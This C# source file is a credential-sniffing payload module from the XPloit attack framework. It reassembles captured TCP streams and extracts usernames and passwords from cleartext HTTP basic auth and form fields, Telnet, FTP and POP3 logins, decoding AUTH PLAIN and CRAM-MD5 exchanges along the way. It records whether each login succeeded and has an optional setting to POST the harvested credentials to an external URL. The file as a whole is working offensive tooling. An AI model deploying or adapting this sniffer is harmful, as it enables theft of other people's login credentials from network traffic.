using PacketDotNet;
using System.Dynamic;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using XPloit.Core;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;
using XPloit.Sniffer.Streams;
using System;
using XPloit.Sniffer.Enums;
using System.Collections.Generic;
using Xploit.Server.Http;
using System.IO;
using Xploit.Server.Http.Interfaces;
using Xploit.Server.Http.Enums;
using System.Collections;
using System.Linq;

namespace XPloit.Modules.Payloads.Local.Sniffer
{
    public class GetCredentials : Payload, Auxiliary.Local.Sniffer.IPayloadSniffer
    {
        #region Configure
        public override string Author { get { return "Fernando Díaz Toledano"; } }
        public override string Description { get { return "Sniffer passwords"; } }
        #endregion

        #region Properties
        public bool CaptureOnTcpStream { get { return true; } }
        public bool CaptureOnPacket { get { return false; } }

        [ConfigurableProperty(Description = "Http post url", Optional = true)]
        public string APIRestUrl { get; set; }

        [ConfigurableProperty(Description = "Write credentials as info")]
        public bool WriteAsInfo { get; set; }
        #endregion

        public bool Check() { return true; }
        public void OnPacket(IPProtocolType protocolType, IpPacket packet) { }

        ICheck[] _Checks = new ICheck[] { ExtractTelnet.Current, ExtractHttp.Current, ExtractFtpPop3.Current };
        public void OnTcpStream(TcpStream stream, bool isNew)
        {
            if (stream == null) return;

            if (isNew)
            {
                stream.Variables = new ExpandoObject();
                stream.Variables.Valid = new bool[] { true, true, true };
            }

            if (stream.Count == 0) return;

            // Check
            bool some = false;
            for (int x = stream.Variables.Valid.Length - 1; x >= 0; x--)
            {
                if (!stream.Variables.Valid[x]) continue;

                Credential[] cred;
                switch (_Checks[x].Check(stream, out cred))
                {
                    case EFound.DontRetry:
                        {
                            stream.Variables.Valid[x] = false;
                            break;
                        }
                    case EFound.Retry: some = true; break;
                    case EFound.True:
                        {
                            Publish(cred);
                            stream.Dispose();
                            return;
                        }
                }
            }

            if (!some)
                stream.Dispose();
        }

        Dictionary<string, int> nhay = new Dictionary<string, int>();
        Dictionary<string, int> hay = new Dictionary<string, int>();

        /// <summary>
        /// Publish method
        /// </summary>
        /// <param name="cred">Credentials</param>
        public void Publish(Credential[] cred)
        {
            if (cred == null) return;

            if (WriteAsInfo)
            {
                foreach (Credential c in cred)
                {
                    if (c.IsValid)
                    {
                        if (!hay.ContainsKey(c.Type)) hay[c.Type] = 0;
                        hay[c.Type]++;

                        WriteInfo(c.ToString());
                    }
                    else
                    {
                        if (!nhay.ContainsKey(c.Type)) nhay[c.Type] = 0;
                        nhay[c.Type]++;

                        WriteError(c.ToString());
                    }
                }
            }
            if (!string.IsNullOrEmpty(APIRestUrl))
            {
                using (HttpClient client = new HttpClient())
                {
                    HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, APIRestUrl);
                    //request.Content.ww
                    client.SendAsync(request);
                }
            }
        }

        public enum EFound
        {
            True,
            Retry,
            DontRetry
        }

        public interface ICheck
        {
            EFound Check(TcpStream stream, out Credential[] cred);
        }

        #region Extractors
        public class ExtractHttp : ICheck
        {
            static ICheck _Current = new ExtractHttp();
            public static ICheck Current { get { return _Current; } }

            List<string> _UserFields = new List<string>(new string[] { "user", "username", "userid", "usuario" });
            List<string> _PasswordFields = new List<string>(new string[] { "pass", "password", "credential", "clave" });

            class server : IHttpServer, IEnumerable<HttpRequest>, IDisposable
            {
                List<HttpRequest> _List = new List<HttpRequest>();
                public bool AllowKeepAlive { get { return true; } }
                public uint MaxPost { get { return uint.MaxValue; } }
                public uint MaxPostMultiPart { get { return uint.MaxValue; } }
                public bool ProgreesOnAllPost { get { return false; } }
                public bool SessionCheckFakeId { get { return false; } }
                public string SessionCookieName { get { return null; } }
                public string SessionDirectory { get { return null; } }
                public bool GetAndPostNamesToLowerCase { get { return true; } }

                IEnumerator IEnumerable.GetEnumerator() { return _List.GetEnumerator(); }
                public IEnumerator<HttpRequest> GetEnumerator() { return _List.GetEnumerator(); }

                public void OnPostProgress(HttpPostProgress post_pg, EHttpPostState start) { }
                public void OnRequest(HttpProcessor httpProcessor) { _List.Add(httpProcessor.Request); }
                public void OnRequestSocket(HttpProcessor httpProcessor) { }
                public bool PushAdd(HttpProcessor httpProcessor, string push_code) { return false; }
                public void PushDel(HttpProcessor httpProcessor, string push_code) { }

                public void Dispose() { _List.Clear(); }
            }

            public EFound Check(TcpStream stream, out Credential[] cred)
            {
                if (!stream.IsClossed)
                {
                    cred = null;
                    if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Client) return EFound.DontRetry;
                    return EFound.Retry;
                }

                if (stream.ClientLength < 1)
                {
                    cred = null;
                    return EFound.DontRetry;
                }

                List<Credential> ls = new List<Credential>();
                foreach (TcpStreamMessage pack in stream)
                    if (pack.Emisor == ETcpEmisor.Client)
                    {
                        if (!pack.DataAscii.Contains("Host: "))
                        {
                            cred = null;
                            return EFound.DontRetry;
                        }

                        using (server s = new server())
                        using (MemoryStream str = new MemoryStream(pack.Data))
                        using (HttpProcessor p = new HttpProcessor(stream.DestinationAddress.ToString(), str, s, true))
                        {
                            foreach (HttpRequest r in s)
                            {
                                string next = pack.Next == null ? null : pack.Next.DataAscii.Split('\n').FirstOrDefault();

                                bool valid = !string.IsNullOrEmpty(next) && next.Contains(" 200 ") && next.StartsWith("HTTP");

                                if (r.Autentication != null)
                                {
                                    ls.Add(new HttpAuthCredential()
                                    {
                                        Address = stream.Destination.Address.ToString(),
                                        Port = stream.DestinationPort,
                                        IsValid = valid,
                                        Password = r.Autentication.Password,
                                        User = r.Autentication.User
                                    });
                                }
                                if (r.GET.Count > 0)
                                {
                                    List<string> users = new List<string>();
                                    List<string> pwds = new List<string>();
                                    Fill(r.GET, users, pwds);

                                    if (users.Count > 0 && pwds.Count > 0)
                                    {
                                        ls.Add(new HttpGetCredential()
                                        {
                                            Address = stream.Destination.Address.ToString(),
                                            Port = stream.DestinationPort,
                                            IsValid = valid,

                                            User = users.Count == 0 ? null : users.ToArray(),
                                            Password = pwds.Count == 0 ? null : pwds.ToArray()
                                        });
                                    }
                                }
                                if (r.POST.Count > 0)
                                {
                                    List<string> users = new List<string>();
                                    List<string> pwds = new List<string>();
                                    Fill(r.POST, users, pwds);

                                    if (users.Count > 0 && pwds.Count > 0)
                                    {
                                        ls.Add(new HttpPostCredential()
                                        {
                                            Address = stream.Destination.Address.ToString(),
                                            Port = stream.DestinationPort,
                                            IsValid = valid,

                                            User = users.Count == 0 ? null : users.ToArray(),
                                            Password = pwds.Count == 0 ? null : pwds.ToArray()
                                        });
                                    }
                                }
                            }
                        }
                    }

                cred = ls.Count == 0 ? null : ls.ToArray();
                return cred == null ? EFound.DontRetry : EFound.True;
            }

            private void Fill(Dictionary<string, string> d, List<string> users, List<string> pwds)
            {
                foreach (string su in new string[] { "login", "uid", "user", "usuario", "mail", "name" })
                    foreach (string k in d.Keys) if (k.Contains(su) && !users.Contains(d[k])) users.Add(d[k]);

                foreach (string su in new string[] { "pass", "pwd", "clave", "hash" })
                    foreach (string k in d.Keys) if (k.Contains(su) && !pwds.Contains(d[k])) pwds.Add(d[k]);
            }
        }

        public class ExtractTelnet : ICheck
        {
            static ICheck _Current = new ExtractTelnet();
            public static ICheck Current { get { return _Current; } }

            List<string> _UserFields = new List<string>(new string[] { "user", "username", "userid", "usuario" });
            List<string> _PasswordFields = new List<string>(new string[] { "pass", "password", "credential", "clave" });

            public string CleanTelnet(byte[] data, int index, int length)
            {
                for (int x = index, max = index + length; x < max; x++)
                {
                    if (data[x] == 0xff)
                    {
                        data[x] = 0x00;
                        if (x + 2 < max)
                        {
                            byte n = data[x + 1];
                            if (n >= 0xf0 && n <= 0xff)
                            {
                                data[x + 1] = 0x00;
                                data[x + 2] = 0x00;
                                x += 2;
                            }
                            else
                            {

                            }
                        }
                    }
                }

                string ret = Encoding.ASCII.GetString(data, index, length);
                return ret.Trim('\r', '\n', '\0');
            }
            public EFound Check(TcpStream stream, out Credential[] cred)
            {
                if (!stream.IsClossed)
                {
                    cred = null;
                    if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Server) return EFound.DontRetry;
                    return EFound.Retry;
                }

                if (stream.ClientLength < 1)
                {
                    cred = null;
                    return EFound.DontRetry;
                }

                bool isTelnet = false;
                string user = null, password = null;

                string nextIs = null;

                TelnetCredential last = null;
                List<TelnetCredential> ret = new List<TelnetCredential>();

                foreach (TcpStreamMessage pack in stream)
                {
                    switch (pack.Emisor)
                    {
                        case ETcpEmisor.Server:
                            {
                                string serverl = CleanTelnet(pack.Data, 0, pack.Data.Length).ToLowerInvariant();
                                if (string.IsNullOrEmpty(serverl))
                                {
                                    isTelnet = true;
                                    continue;
                                }

                                // Check
                                foreach (string uf in _UserFields) if (serverl.Contains(uf)) { nextIs = "user"; isTelnet = true; break; }
                                foreach (string uf in _PasswordFields) if (serverl.Contains(uf)) { nextIs = "pwd"; isTelnet = true; break; }
                                break;
                            }
                        case ETcpEmisor.Client:
                            {
                                if (!isTelnet)
                                {
                                    cred = null;
                                    return EFound.DontRetry;
                                }

                                string data = CleanTelnet(pack.Data, 0, pack.Data.Length);
                                if (string.IsNullOrEmpty(data)) continue;

                                switch (nextIs)
                                {
                                    case "user":
                                        {
                                            user = data;
                                            break;
                                        }
                                    case "pwd":
                                        {
                                            password = data;
                                            nextIs = "valid-check";

                                            last = new TelnetCredential()
                                            {
                                                Address = stream.Destination.Address.ToString(),
                                                Port = stream.DestinationPort,

                                                Password = password,
                                                User = user,
                                                IsValid = false
                                            };
                                            ret.Add(last);
                                            break;
                                        }
                                    case "valid-check":
                                        {
                                            if (last != null)
                                                last.IsValid = true;
                                            break;
                                        }
                                }

                                break;
                            }
                        default:
                            {
                                cred = null;
                                return EFound.DontRetry;
                            }
                    }
                }

                if (!string.IsNullOrEmpty(user) && password == null)
                {
                    last = new TelnetCredential()
                    {
                        Address = stream.Destination.Address.ToString(),
                        Port = stream.DestinationPort,

                        Password = password,
                        User = user,
                        IsValid = false
                    };
                    ret.Add(last);
                }

                cred = ret.Count == 0 ? null : ret.ToArray();
                return cred != null ? EFound.True : EFound.DontRetry;
            }
        }

        public class ExtractFtpPop3 : ICheck
        {
            /*
    # FTP https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes

    ## OK ##

    S> 220-  ~~~ Welcome to OVH ~~~
    S> 220 This is a private system - No anonymous login
    C> USER miUser
    S> 331 User nabla OK. Password required
    C> PASS miPass
    S> 230 OK. Current restricted directory is /


    ## ERROR ##

    S> 220-  ~~~ Welcome to OVH ~~~
    S> 220 This is a private system - No anonymous login
    C> USER miUser
    S> 331 User nabla OK. Password required
    C> PASS miPass
    S> 530 Login authentication failed


    # POP3
    #https://tools.ietf.org/html/rfc1939#page-15


    S> +OK POP3 server ready <1896.697170952@dbc.mtview.ca.us>
    C> APOP mrose c4c9334bac560ecc979e58001b3e22fb
    S> +OK mrose's maildrop has 2 messages (320 octets)
    C> STAT


    S> +OK POP3 server ready <1896.697170952@dbc.mtview.ca.us>
    C> USER mrose
    S> +OK User accepted
    C> PASS tanstaaf
    S> +OK Pass accepted


    S> +OK POP3 server ready <1896.697170952@dbc.mtview.ca.us>
    C> USER mrose
    S> +OK User accepted
    C> PASS tanstaaf
    S> -ERR

         */
            static ICheck _Current = new ExtractFtpPop3();
            public static ICheck Current { get { return _Current; } }

            public EFound Check(TcpStream stream, out Credential[] cred)
            {
                if (stream.ClientLength < 1 || (stream.Count != 1 && stream.Count < 3) || stream.ServerLength < 4)
                {
                    cred = null;
                    if (stream.FirstStream != null && stream.FirstStream.Emisor != ETcpEmisor.Server) return EFound.DontRetry;
                    return EFound.Retry;
                }

                string pop3Type = null;
                bool isValidEnd = false;
                bool isValid = false, isPasswordFilled = false;
                bool isPop3 = false, isFtp = false;
                string user = null, password = null;
                string challenge = null;

                foreach (TcpStreamMessage pack in stream)
                {
                    string sp = pack.DataAscii;

                    if (!isPop3 && !isFtp)
                    {
                        if (pack.Emisor != ETcpEmisor.Server)
                        {
                            cred = null;
                            return EFound.DontRetry;
                        }

                        // CHECK POP3
                        if (sp.StartsWith("+OK "))
                        {
                            isPop3 = true;
                            continue;
                        }
                        // Check FTP
                        int ix;
                        if (sp.Length >= 3 && int.TryParse(sp.Substring(0, 3), out ix) && ix >= 200 && ix <= 299)
                        {
                            isFtp = true;
                            continue;
                        }

                        cred = null;
                        return EFound.DontRetry;
                    }

                    if (pack.Emisor == ETcpEmisor.Client)
                    {
                        if (isPop3)
                        {
                            if (sp.StartsWith("APOP "))
                            {
                                pop3Type = "APOP";
                                user = sp.Substring(5).TrimEnd('\n', '\r');
                                int ix = user.IndexOf(' ');
                                if (ix != -1)
                                {
                                    password = user.Substring(ix + 1);
                                    user = user.Substring(0, ix);
                                    isPasswordFilled = true;
                                }
                                continue;
                            }
                        }

                        if (sp.StartsWith("USER ")) user = sp.Substring(5).TrimEnd('\n', '\r');
                        else if (sp.StartsWith("PASS "))
                        {
                            password = sp.Substring(5).TrimEnd('\n', '\r');
                            isPasswordFilled = true;
                        }
                        else
                        {
                            if (sp.StartsWith("STLS"))
                            {
                                cred = null;
                                return EFound.DontRetry;
                            }

                            if (isPop3)
                            {
                                if (sp.StartsWith("AUTH PLAIN")) pop3Type = "PLAIN";
                                else
                                {
                                    if (sp.StartsWith("AUTH CRAM-MD5")) pop3Type = "CRAM-MD5";
                                    else
                                    {
                                        if (password == null)
                                        {
                                            switch (pop3Type)
                                            {
                                                case "CRAM-MD5":
                                                    {
                                                        try
                                                        {
                                                            user = Encoding.ASCII.GetString(Convert.FromBase64String(sp.TrimEnd('\n', '\r'))).Trim('\0');
                                                            int ix = user.IndexOf(' ');
                                                            if (ix != -1)
                                                            {
                                                                password = user.Substring(ix + 1);
                                                                user = user.Substring(0, ix);
                                                                password += " [" + challenge + "]";
                                                                isPasswordFilled = true;
                                                            }
                                                        }
                                                        catch
                                                        {
                                                            cred = null;
                                                            return EFound.DontRetry;
                                                        }
                                                        break;
                                                    }
                                                case "PLAIN":
                                                    {
                                                        try
                                                        {
                                                            user = Encoding.ASCII.GetString(Convert.FromBase64String(sp.TrimEnd('\n', '\r'))).Trim('\0');
                                                            int ix = user.IndexOf('\0');
                                                            if (ix != -1)
                                                            {
                                                                password = user.Substring(ix + 1);
                                                                user = user.Substring(0, ix);
                                                                isPasswordFilled = true;
                                                            }
                                                        }
                                                        catch
                                                        {
                                                            cred = null;
                                                            return EFound.DontRetry;
                                                        }
                                                        break;
                                                    }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    else
                    {
                        if (isPasswordFilled)
                        {
                            if (isPop3)
                            {
                                isValid = sp.StartsWith("+OK ");
                            }
                            else
                            {
                                int ix;
                                if (sp.Length >= 3 && int.TryParse(sp.Substring(0, 3), out ix))
                                    isValid = (ix >= 200 && ix <= 299);
                            }

                            isValidEnd = true;
                            break;
                        }
                        else
                        {
                            if (isFtp)
                            {
                                int ix;
                                if (sp.Length >= 3 && int.TryParse(sp.Substring(0, 3), out ix))
                                    isValidEnd = (ix >= 500 && ix <= 599);
                            }
                            else
                            {
                                if (isPop3)
                                {
                                    if (pop3Type == "CRAM-MD5")
                                    {
                                        try
                                        {
                                            challenge = sp.TrimEnd('\n', '\r');
                                            int ix = challenge.IndexOf(' ');
                                            if (ix != -1)
                                            {
                                                challenge = challenge.Substring(ix + 1);
                                                //user = Encoding.ASCII.GetString(Convert.FromBase64String(challenge));
                                            }
                                        }
                                        catch
                                        {
                                            cred = null;
                                            return EFound.DontRetry;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if (isValidEnd)
                {
                    if (isPop3)
                    {
                        cred = new Credential[] { new Pop3Credential()
                        {
                            Address = stream.DestinationAddress.ToString(),
                            Port = stream.DestinationPort,

                            AuthType = pop3Type,
                            User = user,
                            Password = password,
                            IsValid = isValid
                        } };
                        return EFound.True;
                    }
                    else
                    {
                        if (isFtp)
                        {
                            cred = new Credential[] {new FTPCredential()
                            {
                                Address = stream.DestinationAddress.ToString(),
                                Port = stream.DestinationPort,

                                User = user,
                                Password = password,
                                IsValid = isValid
                            } };
                            return EFound.True;
                        }
                        else cred = null;
                    }
                }
                else cred = null;

                return isPop3 || isFtp || stream.Count == 0 ? EFound.Retry : EFound.DontRetry;
            }
        }
        #endregion

        #region Credentials
        public class Credential
        {
            /// <summary>
            /// Address
            /// </summary>
            public string Address { get; set; }
            /// <summary>
            /// Port
            /// </summary>
            public ushort Port { get; set; }
            /// <summary>
            /// Credential type
            /// </summary>
            public virtual string Type { get; }
            /// <summary>
            /// Is Valid
            /// </summary>
            public bool IsValid { get; set; }
            /// <summary>
            /// String representation
            /// </summary>
            public override string ToString()
            {
                return JsonHelper.Serialize(this, false, false);
            }
        }
        public class HttpCookieCredential : Credential
        {
            public override string Type { get { return "HTTP-COOKIE"; } }
            /// <summary>
            /// Cookie
            /// </summary>
            public string Cookie { get; set; }
        }
        public class HttpPostCredential : Credential
        {
            public override string Type { get { return "HTTP-POST"; } }
            /// <summary>
            /// User
            /// </summary>
            public string[] User { get; set; }
            /// <summary>
            /// Password
            /// </summary>
            public string[] Password { get; set; }
        }
        public class HttpGetCredential : Credential
        {
            public override string Type { get { return "HTTP-GET"; } }
            /// <summary>
            /// User
            /// </summary>
            public string[] User { get; set; }
            /// <summary>
            /// Password
            /// </summary>
            public string[] Password { get; set; }
        }
        public class HttpAuthCredential : Credential
        {
            public override string Type { get { return "HTTP-AUTH"; } }
            /// <summary>
            /// User
            /// </summary>
            public string User { get; set; }
            /// <summary>
            /// Password
            /// </summary>
            public string Password { get; set; }
        }
        public class TelnetCredential : Credential
        {
            public override string Type { get { return "TELNET"; } }
            /// <summary>
            /// User
            /// </summary>
            public string User { get; set; }
            /// <summary>
            /// Password
            /// </summary>
            public string Password { get; set; }
        }
        public class Pop3Credential : Credential
        {
            public override string Type { get { return "POP3"; } }
            /// <summary>
            /// User
            /// </summary>
            public string User { get; set; }
            /// <summary>
            /// Password
            /// </summary>
            public string Password { get; set; }
            /// <summary>
            /// IsAPOP https://tools.ietf.org/html/rfc1939#page-15
            /// </summary>
            public string AuthType { get; set; }
        }
        public class FTPCredential : Credential
        {
            public override string Type { get { return "FTP"; } }
            /// <summary>
            /// User
            /// </summary>
            public string User { get; set; }
            /// <summary>
            /// Password
            /// </summary>
            public string Password { get; set; }
        }
        #endregion
    }
}